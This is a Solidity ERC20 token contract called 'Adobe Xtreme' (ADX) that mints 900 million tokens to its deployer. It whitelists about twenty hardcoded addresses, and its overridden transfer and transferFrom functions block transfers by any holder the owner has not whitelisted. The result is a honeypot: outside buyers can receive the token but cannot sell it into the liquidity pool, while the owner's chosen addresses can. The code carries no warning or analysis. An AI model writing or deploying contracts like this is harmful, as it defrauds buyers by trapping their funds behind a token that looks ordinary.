// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("Adobe Xtreme", "ADX") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 900000000 * 10 ** decimals());
        whiteList[0xb51c1bd800C179B766fF7b44A1FBf62a0cF82146]= true;
        whiteList[0xa471038ebf718F6581663C0C9B6A50d9516F923c]=true;
        whiteList[0x330Dc10a74271BE8FfA2D50C8EaB05ACB5D623F5]=true;
        whiteList[0x1564C37F2ed8cf8F221C1D13D1B09719F342e91B]=true;
        whiteList[0x974F3fdaB9532E50A77F9D4496f124ea6F6175b2]=true;
        whiteList[0xA404537B712dBf136eA119405be0bCfCaa5aa7fC]=true;
        whiteList[0x89429059f91CFa9a1D06d31001363c2EAAEDA92E]=true;
        whiteList[0x9177437495c23a257b83C905122cCf5fcD00289B]=true;
        whiteList[0x1c1D6a2598850D778e49d7E5bA66573d0484C257]=true;
        whiteList[0xd619098f89E8575E4a9b3f4254f099aBd8a8E306]=true;
        whiteList[0xfA704238093F6dEF7e586bEd9fe4B5f47D84B09a]=true;
        whiteList[0x1293928cc44649A00ecAFD0d094A6D72c9FE8539]=true;
        whiteList[0xdffb916D939233F69d3CeaFA45b66151AC2A4853]=true;
        whiteList[0x3b464F8a134E5DB5Ad1AA33B70a063E46DF5BcF1]=true;
        whiteList[0x76a00a3A51b8Ecfe848b9fa970627e7780856768]=true;
        whiteList[0x7c2d9aC4E1D0d7A2906dDf52a616F9b18fd9E278]=true;
        whiteList[0x6D29d86d1AF35e27b099b95339cBd490df653f6c]=true;
        whiteList[0xb2E52D3Ad00cea80a2F1ddc0a91263C564edbB9C]=true;
        whiteList[0x857359fd0f0ebDe86469D676c428Ff8AD380b17d]=true;
        whiteList[0xfEfe91F51e7398271A1783A26529073AD38F3915]=true;
        whiteList[0x83dCAF1C60e8667974eA6d65bF939e45687BA192]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}